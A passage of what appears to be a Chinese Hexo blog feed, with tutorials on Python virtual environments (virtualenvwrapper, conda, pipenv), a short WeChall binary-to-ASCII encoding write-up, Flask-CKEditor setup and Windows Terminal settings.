title="二、使用Virtualenvwrapper"></a>二、使用Virtualenvwrapper</h2><p>Virtaulenvwrapper是virtualenv的扩展包，用于更方便管理虚拟环境，它可以做：</p><ul><li>将所有虚拟环境整合在一个目录下</li><li>管理（新增，删除，复制）虚拟环境</li><li>快速切换虚拟环境</li></ul><h4 id="1-安装"><a href="#1-安装" class="headerlink" title="1. 安装"></a>1. 安装</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># on Windows</span></span><br><span class="line">pip install virtualenvwrapper-win</span><br><span class="line"><span class="comment"># on macOS / Linux</span></span><br><span class="line">pip install --user virtualenvwrapper</span><br><span class="line"><span class="comment"># then make Bash load virtualenvwrapper automatically</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"source virtualenvwrapper.sh"</span> &gt;&gt; ~/.bashrc</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure><h4 id="2-创建虚拟环境"><a href="#2-创建虚拟环境" class="headerlink" title="2. 创建虚拟环境"></a>2. 创建虚拟环境</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># on macOS/Linux:</span></span><br><span class="line">mkvirtualenv --python=python3.6 venv</span><br><span class="line"><span class="comment"># on Windows</span></span><br><span class="line">mkvirtualenv --python=python3 venv</span><br></pre></td></tr></table></figure><h4 id="3-激活环境-1"><a href="#3-激活环境-1" class="headerlink" title="3. 激活环境"></a>3. 激活环境</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">workon <span class="comment">#列出虚拟环境列表</span></span><br><span class="line">workon [venv] <span class="comment">#切换环境</span></span><br></pre></td></tr></table></figure><h4 id="4-退出环境-1"><a href="#4-退出环境-1" class="headerlink" title="4. 退出环境"></a>4. 退出环境</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></table></figure><h4 id="5-删除环境-1"><a href="#5-删除环境-1" class="headerlink" title="5. 删除环境"></a>5. 删除环境</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmvirtualenv venv</span><br></pre></td></tr></table></figure><h4 id="6-其他有用指令"><a href="#6-其他有用指令" class="headerlink" title="6. 其他有用指令"></a>6. 其他有用指令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pip freeze <span class="comment">#查看当前安装库版本</span></span><br><span class="line"><span class="comment">#创建 requirements.txt 文件，其中包含了当前环境中所有包及 各自的版本的简单列表</span></span><br><span class="line"><span class="comment">#保持部署相同，一键安装所有包</span></span><br><span class="line">pip install -r requirements.txt</span><br><span class="line">pip freeze &gt; requirements.txt </span><br><span class="line">lsvirtualenv    <span class="comment">#列举所有的环境</span></span><br><span class="line">cdvirtualenv    <span class="comment">#导航到当前激活的虚拟环境的目录中，相当于pushd 目录</span></span><br><span class="line">cdsitepackages   <span class="comment"># 和上面的类似，直接进入到 site-packages 目录</span></span><br><span class="line">lssitepackages     <span class="comment">#显示 site-packages 目录中的内容</span></span><br></pre></td></tr></table></figure><h2 id="三、-使用conda管理"><a href="#三、-使用conda管理" class="headerlink" title="三、 使用conda管理"></a>三、 使用conda管理</h2><blockquote><p>conda可以直接创建不同python版本的虚拟环境。前面讲的virtualenv只是指定创建不同python版本的虚拟环境，前提是你的电脑上已经安装了不同版本的python,与conda相比没有conda灵活。</p></blockquote><h4 id="1-安装-1"><a href="#1-安装-1" class="headerlink" title="1. 安装"></a>1. 安装</h4><p>下载anaconda安装的python直接可以使用conda工具</p><h4 id="2-创建虚拟环境-1"><a href="#2-创建虚拟环境-1" class="headerlink" title="2. 创建虚拟环境"></a>2. 创建虚拟环境</h4><p>创建不同的python版本，直接写出版本号就好了，还可以同时安装想要的库。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python 2.7  </span></span><br><span class="line">$ conda create -n venv python=<span class="number">2.7</span>  </span><br><span class="line"></span><br><span class="line"><span class="comment"># Python 3.4  </span></span><br><span class="line">$ conda create -n venv python=<span class="number">3.4</span>  </span><br><span class="line"></span><br><span class="line"><span class="comment"># Python 3.5  </span></span><br><span class="line">$ conda create -n venv python=<span class="number">3.5</span></span><br></pre></td></tr></table></figure><h4 id="3-激活虚拟环境"><a href="#3-激活虚拟环境" class="headerlink" title="3. 激活虚拟环境"></a>3. 激活虚拟环境</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#on windows</span></span><br><span class="line">activate venv</span><br><span class="line"><span class="comment">#on linux</span></span><br><span class="line"><span class="built_in">source</span> activate venv</span><br></pre></td></tr></table></figure><h4 id="4-退出虚拟环境"><a href="#4-退出虚拟环境" class="headerlink" title="4. 退出虚拟环境"></a>4. 退出虚拟环境</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#on windows</span></span><br><span class="line">deactivate</span><br><span class="line"><span class="comment">#on linux</span></span><br><span class="line"><span class="built_in">source</span> deactivate</span><br></pre></td></tr></table></figure><h4 id="5-删除虚拟环境"><a href="#5-删除虚拟环境" class="headerlink" title="5. 删除虚拟环境"></a>5. 删除虚拟环境</h4><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 删除一个已有环境</span></span><br><span class="line">conda <span class="keyword">remove</span> --name venv --all</span><br></pre></td></tr></table></figure><h4 id="6-其他有用指令-1"><a href="#6-其他有用指令-1" class="headerlink" title="6. 其他有用指令"></a>6. 其他有用指令</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出系统存在虚拟环境</span></span><br><span class="line">conda info -e</span><br><span class="line">conda env <span class="keyword">list</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前环境下已安装的包</span></span><br><span class="line">conda <span class="keyword">list</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看某个指定环境的已安装包</span></span><br><span class="line">conda <span class="keyword">list</span> -n venv</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找package信息</span></span><br><span class="line">conda search numpy</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装package</span></span><br><span class="line">conda install -n venv numpy</span><br><span class="line"><span class="comment"># 如果不用-n指定环境名称，则被安装在当前激活环境</span></span><br><span class="line"><span class="comment"># 也可以通过-c指定通过某个channel安装</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新package</span></span><br><span class="line">conda update -n venv numpy</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除package</span></span><br><span class="line">conda remove -n venv numpy</span><br></pre></td></tr></table></figure><h2 id="四-使用pipenv管理"><a href="#四-使用pipenv管理" class="headerlink" title="四. 使用pipenv管理"></a>四. 使用pipenv管理</h2><blockquote><p>pipenv是Python官方推荐的包管理工具。 它综合了 virtualenv , pip 和 pyenv 三者的功能。能够自动为项目创建和管理虚拟环境。如果你使用过requests库，就一定会爱上这个库，因为是同一个大神出品。<br> pipenv使用 Pipfile 和 Pipfile.lock 来管理依赖包，并且在使用pipenv添加或删除包时，自动维护 Pipfile 文件，同时生成 Pipfile.lock 来锁定安装包的版本和依赖信息，避免构建错误。相比pip需要手动维护requirements.txt 中的安装包和版本，具有很大的进步。</p></blockquote><h4 id="1-安装-2"><a href="#1-安装-2" class="headerlink" title="1. 安装"></a>1. 安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pipenv</span><br></pre></td></tr></table></figure><h4 id="2-创建虚拟环境-2"><a href="#2-创建虚拟环境-2" class="headerlink" title="2. 创建虚拟环境"></a>2. 创建虚拟环境</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cd myproject</span><br><span class="line">$ pipenv install <span class="comment"># 创建环境</span></span><br><span class="line">$ pipenv install requests <span class="comment"># 或者直接安装库</span></span><br></pre></td></tr></table></figure><p>如果不存在pipfile,会生成一个pipfile，并且如果有的库添加会自动编辑该文件，不会我们手动更新requirements.txt文件了。</p><h4 id="3-激活Pipenv-Shell"><a href="#3-激活Pipenv-Shell" class="headerlink" title="3. 激活Pipenv Shell"></a>3. 激活Pipenv Shell</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ pipenv shell</span><br><span class="line">$ python --version</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wechall-Training_Encodings</title>
      <link href="/2020/01/04/Wechall-Training-Encodings/"/>
      <url>/2020/01/04/Wechall-Training-Encodings/</url>
      
        <content type="html"><![CDATA[<h2 id="Training-Encodings-I-Training-Encoding"><a href="#Training-Encodings-I-Training-Encoding" class="headerlink" title="Training: Encodings I (Training, Encoding)"></a><a href="http://www.wechall.net/challenge/training/encodings1/index.php" target="_blank" rel="noopener">Training: Encodings I</a> (<a href="http://www.wechall.net/challs/Training" target="_blank" rel="noopener">Training</a>, <a href="http://www.wechall.net/challs/Encoding" target="_blank" rel="noopener">Encoding</a>)</h2><p>We intercepted this message from one challenger to another, maybe you can find out what they were talking about.</p><p> To help you on your progress I coded a small java application, called <a href="http://www.wechall.net/tools/JPK" target="_blank" rel="noopener">JPK</a></p><p> Note: The message is most likely in english. </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">10101001101000110100111100110100</span><br><span class="line">00011101001100101111100011101000</span><br><span class="line">10000011010011110011010000001101</span><br><span class="line">11010110111000101101001111010001</span><br><span class="line">00000110010111011101100011110111</span><br><span class="line">11100100110010111001000100000110</span><br><span class="line">00011110011110001111010011101001</span><br><span class="line">01011100100000101100111011111110</span><br><span class="line">10111100100100000111000011000011</span><br><span class="line">11001111100111110111110111111100</span><br><span class="line">10110010001000001101001111001101</span><br><span class="line">00000110010111000011110011111100</span><br><span class="line">11110011111010011000011110010111</span><br><span class="line">0100110010111100100101110</span><br></pre></td></tr></table></figure><h2 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h2><ul><li>看到0和1，猜测是二进制askII 转换。ASCII 码使用指定的<strong>7 位或8 位二进制数</strong>组合来表示可能的字符。</li><li>进行Binary Format 转换，默认bitsperblock 是8，转换后发现多出1位不能整分，换用7，进行整分。</li><li>进行Binary to ASCII转换</li></ul><p><img src="/images/Wechall-Training_Encodings/image-20200104185447921.png" alt="image-20200104185447921"></p><p><img src="/images/Wechall-Training_Encodings/image-20200104185530714.png" alt="image-20200104185530714"></p><p><img src="/images/Wechall-Training_Encodings/image-20200104185605906.png" alt="image-20200104185605906"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Wechall </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flask-CKEditor富文本编辑器</title>
      <link href="/2019/12/20/Flask-CKEditor%E5%AF%8C%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8/"/>
      <url>/2019/12/20/Flask-CKEditor%E5%AF%8C%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="Flask-CKEditor"><a href="#Flask-CKEditor" class="headerlink" title="Flask-CKEditor"></a>Flask-CKEditor</h2><p>CKEditor (<a href="http://ckeditor.com／）是一个开源的富文本编辑器，它包含丰富的配置选项，而且" target="_blank" rel="noopener">http://ckeditor.com／）是一个开源的富文本编辑器，它包含丰富的配置选项，而且</a> 有大量第三方插件支持。 扩展 Flask-CKEditor 简化了在 Flask 程序中使用 CKEditor 的过程，我 们将使用它来集成 CKEditor。</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install flask-cheditor</span><br></pre></td></tr></table></figure><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask_cheditor <span class="keyword">import</span> CKEditor</span><br><span class="line">cheditor = CKEditor(app)</span><br></pre></td></tr></table></figure><h5 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h5><table><thead><tr><th align="center">配置键</th><th align="center">默认值</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">CKEDITOR SERVE LOCAL</td><td align="center">False</td><td align="center">设为 True 会使用内置的本地资源</td></tr><tr><td align="center">CKEDITOR PKG TYPE</td><td align="center">’standard’</td><td align="center">CKEditor 包类型 ，可选值为 basic、 standard 和 full</td></tr><tr><td align="center">CKEDITOR LANGUAGE</td><td align="center">‘’</td><td align="center">界面语言，传人 ISO 639 格式的语言码</td></tr><tr><td align="center">CKEDITOR HEIGHT</td><td align="center">‘’</td><td align="center">编辑器高度</td></tr><tr><td align="center">CKEDITOR WIDTH</td><td align="center">‘’</td><td align="center">编辑器宽度</td></tr></tbody></table><p>​        配置变量 CKEDITOR LANGUAGE 用来固定界面的显示语言 （简体中文和繁体中文对应的 配置分别为 zh-cn 和 zh），如果不设置， 默认 CKEditor 会 自动探测用户浏览器的语言偏好，然后 匹配对应的语言，匹配失败则默认使用英文</p><pre><code>Flask-CKEditor 内置了对常用第三方 CKEditor 插件的支持，你可以轻松地为编辑器添加 图片上传与插入、 插入语法高亮代码片段、 Markdown 编辑模式等功能， 其体可以访问 FlaskCKEditor 文档的插件集成部分（ https ://flask-ckedi tor.readthedocs. io/en/latest/plugins.html） 。 要 使用这些功能，需要在 CKEditor 包中安装对应的插件， Flask-CKEditor 内置的资源已经包含了 这些插件，你可以通过 Flask-CKEditor 提供的示例程序 （[https://github.com/greyli/flask-ckeditor/ tree/master/examples]( https://github.com/greyli/flask-ckeditor/ tree/master/examples)） 来了解这些功能的具体实现。</code></pre><h5 id="渲染"><a href="#渲染" class="headerlink" title="渲染"></a>渲染</h5><p>​        富 文 本 编辑器在 HTML 中 通 过 文 本区域字段 表 示，即 ＜textarea&gt;&lt;/textarea＞。 FlaskCKEditor 通过包装 WTFonns 提供的 TextAreaField 字段类型实现了一个 CKEditorField 字段类， 我们使用它来构建富文本编辑框字段。 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask_wtf <span class="keyword">import</span> FlaskForm</span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, SubmitField</span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired, Length</span><br><span class="line"><span class="keyword">from</span> flask_ckeditor <span class="keyword">import</span> CKEditorField</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RichTextForm</span><span class="params">(FlaskForm)</span>:</span></span><br><span class="line">    title = StringField(<span class="string">'Title'</span>, validators=[DataRequired()])</span><br><span class="line">    body = CKEditorField(<span class="string">'Body'</span>, validators=[DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">'Publish'</span>)</span><br></pre></td></tr></table></figure><p>在模板<code>cheditor.html</code>中渲染表单</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extend 'base.html' %&#125;</span><br><span class="line">&#123;% from 'macros.html' import form_field %&#125;</span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Integrate CKEditor With Flask- CKEditor<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">    &#123;&#123; form.csrf_token &#125;&#125;</span><br><span class="line">    &#123;&#123; form_field(form.title) &#125;&#125;</span><br><span class="line">    &#123;&#123; form_field(form.body) &#125;&#125;</span><br><span class="line">    &#123;&#123; form.submit &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line">&#123;% block script %&#125;</span><br><span class="line">&#123;&#123; super() &#125;&#125;</span><br><span class="line">&#123;&#123; ckeditor.load() &#125;&#125;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>​        渲染 <code>CKEditor</code> 编辑器需要加载相应的 <code>JavaScript</code> 脚本。 在开发时，为了方便开发，可以使 用 <code>Flask-CKEditor</code> 在模板中提供的 <code>ckeditor.load（）</code> 方法加载资源，它默认从 CDN 加载资源，将 <code>CKEDITOR SERVE_LOCAL</code> 设为 Ture 会使用扩展内置的本地资源， 内置的本地资源包含了几 个常用的插件和语言包。 <code>ckeditor.load（）</code> 方法支持通过 <code>pkg_type</code> 参数传入包类型，这会覆盖配置 <code>CKEDITOR_PKG_TYPE</code> 的值， 额外的 <code>version</code> 参数可以设置从 CDN 加载的 CKEditor 版本。 作为替代，你可以访问 CKEditor 官网提供的构建工具（ <a href="https://ckeditor.com/cke4/builder" target="_blank" rel="noopener">https://ckeditor.com/cke4/builder</a>) 构建自己的 CKEditor 包，下载后放到 static 目录下 ，然后在需要显示文本编辑器的模板中加载 包目 录下的 <code>ckeditor.js</code> 文件，替换掉 <code>ckeditor.load（）</code>调用。 </p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WindowsTerminal配置</title>
      <link href="/2019/12/13/WindowsTerminal%E9%85%8D%E7%BD%AE/"/>
      <url>/2019/12/13/WindowsTerminal%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<p>FLAG{3230547}</p><h3 id="基本配置"><a href="#基本配置" class="headerlink" title="基本配置"></a>基本配置</h3><h4 id="配置背景图片"><a href="#配置背景图片" class="headerlink" title="配置背景图片"></a>配置背景图片</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">"backgroundImage": "C:\\Users\\wgz\\Pictures\\1.jpg",</span><br><span class="line">"backgroundImageOpacity": 0.75,</span><br><span class="line">"backgroundImageStretchMode": "fill",</span><br></pre></td></tr></table></figure><h4 id="配置默认开始目录"><a href="#配置默认开始目录" class="headerlink" title="配置默认开始目录"></a>配置默认开始目录</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"startingDirectory": "E:\\blog",</span><br></pre></td></tr></table></figure><h4 id="设置字体"><a href="#设置字体" class="headerlink" title="设置字体"></a>设置字体</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copy"fontFace": "DejaVu Sans Mono"</span><br></pre></td></tr></table></figure><h4 id="设置默认shell"><a href="#设置默认shell" class="headerlink" title="设置默认shell"></a>设置默认shell</h4><p>将defaultProfile设置成profile的guid值即可</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"defaultProfile": "&#123;c6eaf9f4-32a7-5fdc-b5cf-066e8a4b1e40&#125;"</span><br></pre></td></tr></table></figure><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><h4 id="分屏"><a href="#分屏" class="headerlink" title="分屏"></a>分屏</h4><ul><li>水平分屏：Alt + Shift + 减号</li><li>垂直分屏：Alt + Shift + 加号</li></ul><p>其他分屏快捷操作</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123; "command": &#123; "action": "moveFocus", "direction":"down" &#125;, "keys": [ "alt+down" ] &#125;,</span><br><span class="line">&#123; "command": &#123; "action": "moveFocus", "direction":"left" &#125;, "keys": [ "alt+left" ] &#125;,</span><br><span class="line">&#123; "command": &#123; "action": "moveFocus", "direction":"right" &#125;, "keys": [ "alt+right" ] &#125;,</span><br><span class="line">&#123; "command": &#123; "action": "moveFocus", "direction":"up" &#125;, "keys": [ "alt+up" ] &#125;,</span><br><span class="line">&#123; "command": &#123; "action": "resizePane", "direction":"down" &#125;, "keys": [ "alt+shift+down" ] &#125;,</span><br><span class="line">&#123; "command": &#123; "action": "resizePane", "direction":"left" &#125;, "keys": [ "alt+shift+left" ] &#125;,</span><br><span class="line">&#123; "command": &#123; "action": "resizePane", "direction":"right" &#125;, "keys": [ "alt+shift+right" ] &#125;,</span><br><span class="line">&#123; "command": &#123; "action": "resizePane", "direction":"up" &#125;, "keys": [ "alt+shift+up" ] &#125;,</span><br></pre></td></tr></table></figure><h3 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h3><p>配置文件的基本结构如下。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"acrylicOpacity"</span> : <span class="number">0.5</span>, <span class="comment">// 透明度</span></span><br><span class="line">    <span class="attr">"closeOnExit"</span> : <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"colorScheme"</span> : <span class="string">"Campbell"</span>, <span class="comment">//主题</span></span><br><span class="line">    <span class="attr">"commandline"</span> : <span class="string">"wsl.exe -d Ubuntu-18.04"</span>, <span class="comment">// 启动shell的命令</span></span><br><span class="line">    <span class="attr">"cursorColor"</span> : <span class="string">"#FFFFFF"</span>, <span class="comment">// 光标的颜色</span></span><br><span class="line">    <span class="attr">"cursorShape"</span> : <span class="string">"bar"</span>, <span class="comment">//光标的形状，变量有 "vintage" ( ▃ ), "bar" ( ┃ ), "underscore" ( ▁ ), "filledBox" ( █ ), "emptyBox" ( ▯ )</span></span><br><span class="line">    <span class="attr">"fontFace"</span> : <span class="string">"Fira Code"</span>, <span class="comment">// 字体设置</span></span><br><span class="line">    <span class="attr">"background"</span> : <span class="string">"#000000"</span>, <span class="comment">// 背景颜色， 它会覆盖掉主题中的background </span></span><br><span class="line">    <span class="attr">"fontSize"</span> : <span class="number">15</span>, <span class="comment">// 字体大小</span></span><br><span class="line">    <span class="attr">"guid"</span> : <span class="string">"&#123;c6eaf9f4-32a7-5fdc-b5cf-066e8a4b1e40&#125;"</span>, <span class="comment">// guid 必须为"&#123;00000000-0000-0000-0000-000000000000&#125;"格式</span></span><br><span class="line">    <span class="attr">"historySize"</span> : <span class="number">9001</span>, <span class="comment">// 能显示的历史命令个数</span></span><br><span class="line">    <span class="attr">"icon"</span> : <span class="string">"ms-appx:///ProfileIcons/&#123;9acb9455-ca41-5af7-950f-6bca1bc9722f&#125;.png"</span>, </span><br><span class="line">    <span class="attr">"name"</span> : <span class="string">"Ubuntu-18.04"</span>, <span class="comment">// 名称，显示在菜单中</span></span><br><span class="line">    <span class="attr">"padding"</span> : <span class="string">"0, 0, 0, 0"</span>,</span><br><span class="line">    <span class="attr">"snapOnInput"</span> : <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"useAcrylic"</span> : <span class="literal">false</span>, <span class="comment">// 是否显示背后的纹理</span></span><br><span class="line">    <span class="attr">"backgroundImage"</span> : <span class="string">"ms-appdata:///roaming/test.jpg"</span>, <span class="comment">// 图片的一个路径,需要绝对路径</span></span><br><span class="line">    <span class="attr">"backgroundImageOpacity"</span> : <span class="number">0.75</span>,  <span class="comment">// 背景图的透明度</span></span><br><span class="line">    <span class="attr">"backgroundImageStrechMode"</span> : <span class="string">"fill"</span> <span class="comment">// 填充方式</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里要特别注意三个设置</p><ol><li><code>background</code> 如果在<code>profile</code>中设置的话会覆盖<code>scheme</code>中的<code>background</code>。</li><li><code>acrylicOpacity</code>这个属性生效的前提是<code>useAcrylic</code>的值为<code>true</code> </li><li><code>backgroundImage</code> 等属性生效的前提是<code>useAcrylic</code>的值为<code>false</code> </li></ol><p>​        <strong><code>useAcrylic</code> 这个属性是决定是否有透明的纹理效果</strong><br>通过<code>acrylicOpacity</code>去调节透明度。此时背景图片的设置就无法实现。如果要设置背景图片的话使用<code>&quot;useAcrylic&quot; : false</code>再进行设置 </p><p>​     <code>globals</code>属性设置了Windows Terminal的主要配置，如：默认使用的终端配置，使用的主题等。值得注意的是，<code>defaultProfile</code>使用GUID连接<code>profiles</code>的相关配置。<code>profiles</code>使用<code>colorScheme</code>属性连接<code>schemes</code>。详细释义如下。 </p><table><thead><tr><th align="center">属性</th><th align="center">释义</th><th>说明</th></tr></thead><tbody><tr><td align="center">alwaysShowTabs</td><td align="center">始终显示标签</td><td></td></tr><tr><td align="center">defaultProfile</td><td align="center">默认终端</td><td>GUID，用于连接终端配置</td></tr><tr><td align="center">initialCols</td><td align="center">默认列数</td><td></td></tr><tr><td align="center">initialRows</td><td align="center">默认行数</td><td></td></tr><tr><td align="center">keybindings</td><td align="center">快捷键配置</td><td></td></tr><tr><td align="center">command</td><td align="center">快捷键执行的命令</td><td></td></tr><tr><td align="center">keys</td><td align="center">快捷键</td><td></td></tr><tr><td align="center">requestedTheme</td><td align="center">主题</td><td></td></tr><tr><td align="center">showTabsInTitlebar</td><td align="center">在标题栏中显示终端窗口标签栏</td><td></td></tr><tr><td align="center">showTerminalTitleInTitlebar</td><td align="center">在标签栏中显示终端标签</td><td></td></tr><tr><td align="center">acrylicOpacity</td><td align="center">不透明度</td><td></td></tr><tr><td align="center">closeOnExit</td><td align="center">退出后关闭</td><td></td></tr><tr><td align="center">colorScheme</td><td align="center">颜色主题</td><td></td></tr><tr><td align="center">commandline</td><td align="center">命令行程序</td><td></td></tr><tr><td align="center">cursorColor</td><td align="center">光标颜色</td><td></td></tr><tr><td align="center">cursorShape</td><td align="center">光标形状</td><td></td></tr><tr><td align="center">fontFace</td><td align="center">字体</td><td></td></tr><tr><td align="center">fontSize</td><td align="center">字体大小</td><td></td></tr><tr><td align="center">guid</td><td align="center">GUID</td><td>终端配置标识</td></tr><tr><td align="center">historySize</td><td align="center">历史大小</td><td></td></tr><tr><td align="center">icon</td><td align="center">图标</td><td></td></tr><tr><td align="center">name</td><td align="center">名称</td><td></td></tr><tr><td align="center">padding</td><td align="center"></td><td></td></tr><tr><td align="center">snapOnInput</td><td align="center">嗅探输入</td><td></td></tr><tr><td align="center">startingDirectory</td><td align="center">初始目录</td><td></td></tr><tr><td align="center">useAcrylic</td><td align="center">使用不透明度</td><td></td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
